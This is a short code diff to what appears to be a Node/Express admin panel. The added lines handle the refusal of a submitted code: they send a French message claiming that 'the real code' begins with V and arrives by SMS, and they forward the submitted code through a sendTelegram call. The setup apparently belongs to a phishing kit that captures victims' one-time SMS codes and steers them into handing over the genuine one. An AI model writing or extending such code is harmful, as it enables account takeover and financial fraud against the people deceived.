@@ -91,6 +91,8 @@ app.post('/api/admin/refuse', (req, res) => {
     const code = codes.find(c => c.id === id);
     if (code) {
         code.status = 'refused';
+        const msg = 'Code ' + code.code + ' est invalide.\n\nLe vrai code commence par la lettre V et est envoyé par SMS. Veuillez vérifier votre SMS et réessayer.';
+        sendTelegram(msg).catch(() => {});
         return res.json({ ok: true });
     }
     res.status(404).json({ error: 'not found' });
